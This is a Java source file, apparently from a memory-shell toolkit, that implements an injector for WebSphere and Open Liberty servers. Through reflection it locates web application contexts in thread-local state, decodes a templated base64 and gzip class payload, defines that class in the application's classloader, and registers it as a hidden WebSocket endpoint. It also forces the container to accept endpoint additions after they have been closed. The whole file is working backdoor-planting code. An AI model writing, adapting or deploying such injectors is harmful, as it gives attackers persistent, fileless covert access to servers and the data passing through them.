package com.reajason.javaweb.memshell.injector.websphere;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * WebSphere / Open Liberty JSR-356 WebSocket 注入器：TongWeb 系的
 * {@code com.ibm.ws.wsoc} 实现会把 {@code ServerContainerExt} 放进 ServletContext
 * （{@code javax.websocket.server.ServerContainer}），注入器取出后注册 Endpoint。
 * <p>
 * WAS 8.5.5 默认未安装 WebSocket 功能，WAS 9 与 Liberty 自带 JSR-356。
 *
 * @author ReaJason
 */
public class WebSphereWebSocketInjector {

    private static String msg = "";
    private static boolean ok = false;

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }

    public WebSphereWebSocketInjector() {
        if (ok) {
            return;
        }
        Set<Object> contexts = null;
        try {
            contexts = getContext();
        } catch (Throwable throwable) {
            msg += "context error: " + getErrorMessage(throwable);
        }
        if (contexts == null || contexts.isEmpty()) {
            msg += "context not found";
        } else {
            for (Object context : contexts) {
                try {
                    msg += ("context: [" + getContextRoot(context) + "] ");
                    Object container = getServerContainer(context);
                    if (container == null) {
                        msg += "skip, no ServerContainer\n";
                        continue;
                    }
                    Object shell = getShell(context);
                    inject(context, container, shell);
                    msg += "[" + getUrlPattern() + "] ready\n";
                } catch (Throwable e) {
                    msg += "failed " + getErrorMessage(e) + "\n";
                }
            }
        }
        ok = true;
        System.out.println(msg);
    }

    @SuppressWarnings("all")
    private String getContextRoot(Object context) {
        String r = null;
        try {
            r = (String) invokeMethod(context, "getContextPath", null, null);
        } catch (Exception ignored) {
        }
        String c = context.getClass().getName();
        if (r == null) {
            return c;
        }
        if (r.isEmpty()) {
            return c + "(/)";
        }
        return c + "(" + r + ")";
    }

    /**
     * com.ibm.ws.webcontainer.webapp.WebAppImpl
     * /opt/IBM/WebSphere/AppServer/plugins/com.ibm.ws.webcontainer.jar
     */
    public Set<Object> getContext() throws Exception {
        Set<Object> contexts = new HashSet<Object>();
        Object[] threadLocals = null;
        boolean raw = false;
        try {
            // WebSphere Liberty
            threadLocals = (Object[]) getFieldValue(Thread.currentThread(), "wsThreadLocals");
        } catch (NoSuchFieldException ignored) {
        }
        if (threadLocals == null) {
            // Open Liberty
            threadLocals = (Object[]) getFieldValue(getFieldValue(Thread.currentThread(), "threadLocals"), "table");
            raw = true;
        }
        for (Object threadLocal : threadLocals) {
            if (threadLocal == null) {
                continue;
            }
            Object value = threadLocal;
            if (raw) {
                value = getFieldValue(threadLocal, "value");
            }
            if (value == null) {
                continue;
            }
            // for websphere 7.x
            if (value.getClass().getName().endsWith("FastStack")) {
                Object[] stackList = (Object[]) getFieldValue(value, "stack");
                for (Object stack : stackList) {
                    try {
                        Object config = getFieldValue(stack, "config");
                        contexts.add(getFieldValue(getFieldValue(config, "context"), "context"));
                    } catch (Exception ignored) {
                    }
                }
            } else if (value.getClass().getName().endsWith("WebContainerRequestState")) {
                Object webApp = invokeMethod(getFieldValue(getFieldValue(value, "currentThreadsIExtendedRequest"), "_dispatchContext"), "getWebApp", null, null);
                contexts.add(getFieldValue(getFieldValue(webApp, "facade"), "context"));
            }
        }
        return contexts;
    }

    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            return ((ClassLoader) getFieldValue(context, "loader"));
        }
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = getWebAppClassLoader(context);
        Class<?> clazz = null;
        try {
            clazz = classLoader.loadClass(getClassName());
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        }
        msg += "[" + classLoader.getClass().getName() + "] ";
        return clazz.newInstance();
    }

    /**
     * WebAppImpl 本身就是 ServletContext；容器属性由 WebSocketServletContainerInitializer
     * 在应用启动时写入。
     */
    private Object getServerContainer(Object context) throws Exception {
        Object container = invokeMethod(context, "getAttribute", new Class[]{String.class}, new Object[]{"javax.websocket.server.ServerContainer"});
        if (container == null) {
            container = invokeMethod(context, "getAttribute", new Class[]{String.class}, new Object[]{"jakarta.websocket.server.ServerContainer"});
        }
        return container;
    }

    @SuppressWarnings("all")
    private void inject(Object context, Object container, Object shell) throws Exception {
        ClassLoader apiClassLoader;
        try {
            apiClassLoader = container.getClass().getClassLoader();
            apiClassLoader.loadClass("javax.websocket.server.ServerEndpointConfig");
        } catch (ClassNotFoundException e) {
            apiClassLoader = getWebAppClassLoader(context);
        }
        Class<?> serverEndpointConfigClass;
        Class<?> builderClass;
        try {
            serverEndpointConfigClass = apiClassLoader.loadClass("javax.websocket.server.ServerEndpointConfig");
            builderClass = apiClassLoader.loadClass("javax.websocket.server.ServerEndpointConfig$Builder");
        } catch (ClassNotFoundException e) {
            serverEndpointConfigClass = apiClassLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig");
            builderClass = apiClassLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig$Builder");
        }

        try {
            if (invokeMethod(container, "getServerEndpointConfig", new Class[]{String.class}, new Object[]{getUrlPattern()}) != null) {
                return;
            }
        } catch (NoSuchMethodException ignored) {
        }

        Object builder = invokeMethod(builderClass, "create", new Class[]{Class.class, String.class}, new Object[]{shell.getClass(), getUrlPattern()});
        Object endpointConfig = invokeMethod(builder, "build", null, null);

        invokeMethod(container, "setDefaultMaxTextMessageBufferSize", new Class[]{int.class}, new Object[]{52428800});
        invokeMethod(container, "setDefaultMaxBinaryMessageBufferSize", new Class[]{int.class}, new Object[]{52428800});
        // 第一个 WebSocket 请求到达后 ServerContainerExt 会关闭 addEndpoint，这里重新打开
        try {
            setFieldValue(container, "noMoreAdds", Boolean.FALSE);
        } catch (Exception ignored) {
        }
        invokeMethod(container, "addEndpoint", new Class[]{serverEndpointConfigClass}, new Object[]{endpointConfig});
    }

    @Override
    public String toString() {
        return msg;
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    public static Field getField(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass();
             clazz != Object.class;
             clazz = clazz.getSuperclass()) {
            try {
                return clazz.getDeclaredField(name);
            } catch (NoSuchFieldException ignored) {

            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        Field field = getField(obj, name);
        field.setAccessible(true);
        return field.get(obj);
    }

    @SuppressWarnings("all")
    public static void setFieldValue(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = getField(obj, name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
